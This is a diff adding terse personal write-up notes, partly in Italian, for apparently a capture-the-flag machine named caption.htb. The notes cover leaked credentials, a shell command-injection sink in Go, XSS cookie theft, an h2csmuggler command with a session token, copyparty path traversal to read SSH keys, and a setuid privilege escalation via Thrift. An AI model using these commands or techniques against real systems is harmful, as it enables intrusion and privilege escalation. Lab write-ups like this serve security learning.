@@ -1,0 +1,27 @@
+found a password in the older commits on the gitbucket on port 8080
+user: margo pwd: vFr&cS2#0!
+to log in on the main service on port 80
+
+
+command execution sul log service:
+        logs := fmt.Sprintf("echo 'IP Address: %s, User-Agent: %s, Timestamp: %s' >> output.log", ip, userAgent, timestamp)
+        exec.Command{"/bin/sh", "-c", logs}
+
+running test on all possibile headers on page /firewalls and finding replication of value is stuf like this:
+ <link href="http://caption.htb/static/css/bootstrap.min.css?utm_source=http://TestValue123" rel="stylesheet"
+    integrity="
+
+che può essere usata per fare una XSS e rubare il cookie admin
+
+tramite il cookie admin si effettua smuggling usando h2csmuggler.py per visitare logs, sul quale di trovano altri endpoint verso un servizio interno su porta 3923.
+
+effettuando le richieste verso quell'endpoint
+python3 h2csmuggler.py -x http://caption.htb/firewalls http://caption.htb/download?url=http://127.0.0.1:3923/ssh_logs -H "Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzM3NzE1Nzc1fQ.ACVXLqQ4ZpzbGtA7uH3kTK7WjSZiPhGZwWXrS-pgkFM" > export/ssh_logs.html
+
+possiamo scaricare dei log. Finendo invece su una pagina non esistente troviamo una pagina di errore che mostra info sul servizio:
+<span id="pb"><span>powered by</span> <a href="https://github.com/9001/copyparty">copyparty </a></span>
+
+che è vulnerabile a path traversal e che possiamo usare per leggere chiavi SSH di margo che abbiamo visto dai log essere del tipo ECDSA, quindi prviamo con i nomi standard: id_ecdsa
+
+
+una volta user notiamo un servizio sulla 9090 già visto tempo fa sui file di LogService, dove si notava la possiilità di esecuzione codice da un log contenente User-Agent. A seguito del port-forward della porta, cercando online si scopre come creare un client Thrift per potere comunicare con il servizio e fare impostare il setuid su /bin/bash
